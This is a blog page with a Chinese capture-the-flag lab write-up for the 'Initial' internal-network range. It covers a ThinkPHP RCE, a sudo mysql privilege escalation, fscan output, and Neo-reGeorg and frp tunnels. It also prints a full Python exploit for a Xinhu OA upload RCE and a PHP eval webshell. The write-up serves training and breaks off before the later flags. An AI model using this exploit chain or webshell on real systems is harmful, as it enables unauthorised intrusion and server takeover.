@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="靶标介绍：12345by:https:&#x2F;&#x2F;yunjing.ichunqiu.com&#x2F;major&#x2F;detail&#x2F;1077Initial是一套难度为简单的靶场环境完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。靶场IP:39.99.254.114  fscan探针fscan.exe -h 39.99.254.114  tp5.0.23 1存在tp.5.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Initial">
+<meta property="og:url" content="https://liangmosec.github.io/2024/07/13/Initial/index.html">
+<meta property="og:site_name" content="Liangmo_sec">
+<meta property="og:description" content="靶标介绍：12345by:https:&#x2F;&#x2F;yunjing.ichunqiu.com&#x2F;major&#x2F;detail&#x2F;1077Initial是一套难度为简单的靶场环境完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。靶场IP:39.99.254.114  fscan探针fscan.exe -h 39.99.254.114  tp5.0.23 1存在tp.5.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713095025538.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713095110220.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713095157853.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713095448561.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713095852910.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713100022716.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713100344555.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713101550721.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713101701543.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713104310919.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713104445273.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713104912072.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713105229511.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713133108576.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713105323691.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713110308717.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713111430344.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713150624892.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713150735800.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713150947040.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713152544591.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713152720983.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816021632373.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816022213624.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816022340115.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816022518806.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816023011618.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816024650303.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816024907973.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816023130833.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816024343096.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816025216275.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240816025439687-1723748544811-11.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713140520346.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713142814653.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713143047772.png">
+<meta property="article:published_time" content="2024-07-13T07:48:20.000Z">
+<meta property="article:modified_time" content="2024-08-15T19:16:30.495Z">
+<meta property="article:author" content="凉墨">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713095025538.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Initial</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/07/16/%E7%AC%AC%E5%9B%9B%E7%AB%A0-Windows%E5%AE%9E%E6%88%98-emlog/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/07/12/%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%9A%90%E8%97%8F/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://liangmosec.github.io/2024/07/13/Initial/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://liangmosec.github.io/2024/07/13/Initial/&text=Initial"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://liangmosec.github.io/2024/07/13/Initial/&title=Initial"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://liangmosec.github.io/2024/07/13/Initial/&is_video=false&description=Initial"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Initial&body=Check out this article: https://liangmosec.github.io/2024/07/13/Initial/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://liangmosec.github.io/2024/07/13/Initial/&title=Initial"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://liangmosec.github.io/2024/07/13/Initial/&title=Initial"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://liangmosec.github.io/2024/07/13/Initial/&title=Initial"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://liangmosec.github.io/2024/07/13/Initial/&title=Initial"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://liangmosec.github.io/2024/07/13/Initial/&name=Initial&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://liangmosec.github.io/2024/07/13/Initial/&t=Initial"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%A0%87%E4%BB%8B%E7%BB%8D%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">靶标介绍：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fscan%E6%8E%A2%E9%92%88"><span class="toc-number">2.</span> <span class="toc-text">fscan探针</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tp5-0-23"><span class="toc-number">2.1.</span> <span class="toc-text">tp5.0.23</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag01"><span class="toc-number">2.2.</span> <span class="toc-text">flag01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.3.</span> <span class="toc-text">内网探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B8%A9%E5%9D%91%E4%B8%80"><span class="toc-number">2.3.1.</span> <span class="toc-text">踩坑一</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">内网隧道搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Neo-reGeorg"><span class="toc-number">3.1.</span> <span class="toc-text">Neo-reGeorg</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B8%A9%E5%9D%91%E4%BA%8C"><span class="toc-number">3.1.1.</span> <span class="toc-text">踩坑二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#frp"><span class="toc-number">3.2.</span> <span class="toc-text">frp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#frps-ini"><span class="toc-number">3.2.1.</span> <span class="toc-text">frps.ini</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#frpc-ini"><span class="toc-number">3.2.2.</span> <span class="toc-text">frpc.ini</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E5%91%BCOA%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">3.3.</span> <span class="toc-text">信呼OA方法一</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B8%A9%E5%9D%91%E4%B8%89"><span class="toc-number">3.3.1.</span> <span class="toc-text">踩坑三</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B8%A9%E5%9D%91%E5%9B%9B"><span class="toc-number">3.3.2.</span> <span class="toc-text">踩坑四</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E5%91%BCOA%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">3.4.</span> <span class="toc-text">信呼OA方法二</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B8%A9%E5%9D%91%E4%BA%94"><span class="toc-number">3.4.1.</span> <span class="toc-text">踩坑五</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag02"><span class="toc-number">3.5.</span> <span class="toc-text">flag02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag03"><span class="toc-number">3.6.</span> <span class="toc-text">flag03</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Initial
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">凉墨</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-07-13T07:48:20.000Z" class="dt-published" itemprop="datePublished">2024-07-13</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">春秋云镜</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="靶标介绍："><a href="#靶标介绍：" class="headerlink" title="靶标介绍："></a>靶标介绍：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">by:https://yunjing.ichunqiu.com/major/detail/1077</span><br><span class="line">Initial是一套难度为简单的靶场环境</span><br><span class="line">完成该挑战可以帮助玩家初步认识内网渗透的简单流程。</span><br><span class="line">该靶场只有一个flag，各部分位于不同的机器上。</span><br><span class="line">靶场IP:39.99.254.114</span><br></pre></td></tr></table></figure>
+
+<h2 id="fscan探针"><a href="#fscan探针" class="headerlink" title="fscan探针"></a>fscan探针</h2><p><code>fscan.exe -h 39.99.254.114</code></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713095025538.png" alt="image-20240713095025538"></p>
+<h3 id="tp5-0-23"><a href="#tp5-0-23" class="headerlink" title="tp5.0.23"></a>tp5.0.23</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713095110220.png" alt="image-20240713095110220"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">存在tp.5.0.23RCE</span><br></pre></td></tr></table></figure>
+
+<p>TP利用工具 一键getshell</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713095157853.png" alt="image-20240713095157853"></p>
+<h3 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h3><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713095448561.png" alt="image-20240713095448561"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">得到低权限用户</span><br><span class="line">mysql 可以进行免密使用</span><br><span class="line">可以使用 mysql 命令暂时获取 root 权限</span><br><span class="line">想要执行其他命令，可以使用 mysql -e 模式</span><br></pre></td></tr></table></figure>
+
+<p><code>sudo mysql -e &#39;\! find / -name &quot;flag*&quot;&#39;</code></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713095852910.png" alt="image-20240713095852910"></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713100022716.png" alt="image-20240713100022716"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Congratulations!!! You found the first flag, the next flag may be in a server in the internal network.</span><br><span class="line">flag01: flag&#123;60b53231-</span><br></pre></td></tr></table></figure>
+
+<h3 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h3><p>用蚁剑上传fscan工具到&#x2F;var&#x2F;www&#x2F;html</p>
+<h4 id="踩坑一"><a href="#踩坑一" class="headerlink" title="踩坑一"></a>踩坑一</h4><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713100344555.png" alt="image-20240713100344555"></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713101550721.png" alt="image-20240713101550721"><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713101701543.png" alt="image-20240713101701543"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.1.18     is alive</span><br><span class="line">(icmp) Target 172.22.1.2      is alive</span><br><span class="line">(icmp) Target 172.22.1.15     is alive</span><br><span class="line">(icmp) Target 172.22.1.21     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.1.18:3306 open</span><br><span class="line">172.22.1.21:445 open</span><br><span class="line">172.22.1.2:445 open</span><br><span class="line">172.22.1.18:445 open</span><br><span class="line">172.22.1.18:80 open</span><br><span class="line">172.22.1.21:139 open</span><br><span class="line">172.22.1.2:139 open</span><br><span class="line">172.22.1.18:139 open</span><br><span class="line">172.22.1.21:135 open</span><br><span class="line">172.22.1.2:135 open</span><br><span class="line">172.22.1.18:135 open</span><br><span class="line">172.22.1.15:22 open</span><br><span class="line">172.22.1.15:80 open</span><br><span class="line">172.22.1.2:88 open</span><br><span class="line">[*] alive ports len is: 14</span><br><span class="line">start vulscan</span><br><span class="line">[*] OsInfo 172.22.1.2	(Windows Server 2016 Datacenter 14393)</span><br><span class="line">[+] MS17-010 172.22.1.21	(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.18</span><br><span class="line">   [-&gt;]XIAORANG-OA01</span><br><span class="line">   [-&gt;]172.22.1.18</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.2</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.1.2</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.1.21</span><br><span class="line">   [-&gt;]XIAORANG-WIN7</span><br><span class="line">   [-&gt;]172.22.1.21</span><br><span class="line">[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span><br><span class="line">[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin</span><br><span class="line">[*] WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login</span><br><span class="line">[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600</span><br><span class="line">[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统</span><br><span class="line">[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1</span><br><span class="line">已完成 14/14</span><br><span class="line">[*] 扫描结束,耗时: 10.969777995s</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">172.22.1.2	DC01</span><br><span class="line">172.22.1.21	XIAORANG-WIN7</span><br><span class="line">172.22.1.18	信呼协同办公系统</span><br></pre></td></tr></table></figure>
+
+<h2 id="内网隧道搭建"><a href="#内网隧道搭建" class="headerlink" title="内网隧道搭建"></a>内网隧道搭建</h2><h3 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h3><p>上传tunnel.php脚本  使用Neo-reGeorg搭建</p>
+<h4 id="踩坑二"><a href="#踩坑二" class="headerlink" title="踩坑二"></a>踩坑二</h4><p><code>python neoreg.py -u http://39.99.254.114/tunnel.php -k liangmo</code></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713104310919.png" alt="image-20240713104310919"></p>
+<p>直接套用了原模板文件  结果导致密码错误<br>根据文档重新生成模板文件 然后再次上传</p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713104445273.png" alt="image-20240713104445273"></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713104912072.png" alt="image-20240713104912072"></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713105229511.png" alt="image-20240713105229511"></p>
+<blockquote>
+<p>感觉 neo创建的隧道不稳定</p>
+<p>proxifier做的代理 走电脑全局流量  体验感差</p>
+</blockquote>
+<h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><h4 id="frps-ini"><a href="#frps-ini" class="headerlink" title="frps.ini"></a>frps.ini</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_ip = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>
+
+<h4 id="frpc-ini"><a href="#frpc-ini" class="headerlink" title="frpc.ini"></a>frpc.ini</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = xxx.xx.xxx.xx</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5_to_2]</span><br><span class="line">type = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port = 8000</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713133108576.png" alt="image-20240713133108576"></p>
+<p>上传frp</p>
+<p>然后 代理 只通过 SwitchyOmega 和 proxychains 走代理</p>
+<h3 id="信呼OA方法一"><a href="#信呼OA方法一" class="headerlink" title="信呼OA方法一"></a>信呼OA方法一</h3><blockquote>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/118675321">代码审计·信呼协同办公系统2.2存在文件上传配合云处理函数组合拳RCE_信呼协同办公系统弱口令-CSDN博客</a></p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713105323691.png" alt="image-20240713105323691"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin:admin123</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713110308717.png" alt="image-20240713110308717"></p>
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713111430344.png" alt="image-20240713111430344"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url_pre = &#x27;http://172.22.1.18/&#x27;</span><br><span class="line">url1 = url_pre + &#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span><br><span class="line">url2 = url_pre + &#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span><br><span class="line">url3 = url_pre + &#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    &#x27;rempass&#x27;: &#x27;0&#x27;,</span><br><span class="line">    &#x27;jmpass&#x27;: &#x27;false&#x27;,</span><br><span class="line">    &#x27;device&#x27;: &#x27;1625884034525&#x27;,</span><br><span class="line">    &#x27;ltype&#x27;: &#x27;0&#x27;,</span><br><span class="line">    &#x27;adminuser&#x27;: &#x27;YWRtaW4=&#x27;,</span><br><span class="line">    &#x27;adminpass&#x27;: &#x27;YWRtaW4xMjM=&#x27;,</span><br><span class="line">    &#x27;yanzm&#x27;: &#x27;&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;&#x27;file&#x27;: open(&#x27;1.php&#x27;, &#x27;r+&#x27;)&#125;)</span><br><span class="line"></span><br><span class="line">filepath = str(r.json()[&#x27;filepath&#x27;])</span><br><span class="line">filepath = &quot;/&quot; + filepath.split(&#x27;.uptemp&#x27;)[0] + &#x27;.php&#x27;</span><br><span class="line">id = r.json()[&#x27;id&#x27;]</span><br><span class="line"></span><br><span class="line">url3 = url_pre + f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&#123;id&#125;&#x27;</span><br><span class="line"></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath)</span><br><span class="line">print(r.text)</span><br><span class="line">print(url_pre + filepath)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">8</span>]);</span><br><span class="line"><span class="comment">//1.php ?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240713150624892.png" alt="image-20240713150624892"></p>
